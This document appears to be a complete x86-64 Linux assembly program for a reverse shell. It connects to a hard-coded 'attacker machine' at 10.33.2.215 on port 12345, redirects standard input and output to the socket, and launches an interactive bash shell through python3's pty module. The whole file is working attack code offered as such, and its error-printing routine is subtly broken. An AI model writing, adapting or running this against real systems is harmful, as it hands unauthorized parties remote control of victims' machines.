bits 64

global _start

section .bss
struc sockaddr_in
        sin_family      resw 1
        sin_port        resw 1
        sin_addr        resd 1
endstruc
sock_fd resd 1

section .rodata
sh_cmd db "/usr/bin/python3", 0
arg1 db "-c", 0
arg2 db "import pty; pty.spawn('/bin/bash')", 0

err_socket db "[-] Socket creation failed", 10, 0
err_connect db "[-] Connection failed", 10, 0
err_dup2 db "[-] dup2 failed", 10, 0
err_exec db "[-] execve failed", 10, 0

init_struct:
        istruc sockaddr_in                      
                at sin_family,  dw 2            ; AF_INET (IPv4)
                at sin_port,    dw 0x3930       ; Port 12345 (little-endian)
                at sin_addr,    dd 0xD702210A   ; IP 10.33.2.215 (little-endian)
        iend

section .text
_start:
        ; Create socket
        mov rax, 41                             ; syscall: socket
        mov rdi, 2                              ; domain: AF_INET (IPv4)
        mov rsi, 1                              ; type: SOCK_STREAM
        mov rdx, 6                              ; protocol: IPPROTO_TCP
        syscall
        test rax, rax                           ; Check if syscall failed
        js error_socket                         ; Jump if error (rax < 0)
        mov [sock_fd], rax                      ; Save socket FD

connect_socket:
        ; Connect to attacker machine
        mov rax, 42                             ; syscall: connect
        mov rdi, [sock_fd]                      ; socket FD
        mov rsi, init_struct                    ; sockaddr_in struct
        mov rdx, 16                             ; size of sockaddr_in
        syscall
        test rax, rax
        js error_connect

dup_stdin:
        ; Duplicate socket FD to stdin (0)
        mov rax, 33                             ; syscall: dup2
        mov rdi, [sock_fd]
        mov rsi, 0
        syscall
        test rax, rax
        js error_dup2

dup_stdout:
        ; Duplicate socket FD to stdout (1)
        mov rax, 33
        mov rdi, [sock_fd]
        mov rsi, 1
        syscall
        test rax, rax
        js error_dup2

dup_stderr:
        ; Duplicate socket FD to stderr (2)
        mov rax, 33
        mov rdi, [sock_fd]
        mov rsi, 2
        syscall
        test rax, rax
        js error_dup2

init_shell:
        ; Execute Python3 to spawn a fully interactive Bash shell
        mov rax, 59                             ; syscall: execve
        mov rdi, sh_cmd                         ; path: /usr/bin/python3
        lea rsi, [rel args]                     ; argv = {"/usr/bin/python3", "-c", "import pty; pty.spawn('/bin/bash')", NULL}
        xor rdx, rdx                            ; envp = NULL
        syscall
        test rax, rax
        js error_exec                           ; If execve fails, show error and exit

args:
        dq sh_cmd
        dq arg1
        dq arg2
        dq 0

; ------------------------------------------
; ERROR HANDLING ROUTINES
; ------------------------------------------

error_socket:
        mov rdi, err_socket
        call print_error
        jmp exit

error_connect:
        mov rdi, err_connect
        call print_error
        jmp exit

error_dup2:
        mov rdi, err_dup2
        call print_error
        jmp exit

error_exec:
        mov rdi, err_exec
        call print_error
        jmp exit

print_error:
        mov rax, 1                              ; syscall: write
        mov rdi, 2                              ; stderr
        mov rsi, rdi                            ; error message
        mov rdx, 30                             ; max length to write
        syscall
        ret

exit:
        mov rax, 60                             ; syscall: exit
        xor rdi, rdi                            ; exit(0)
        syscall

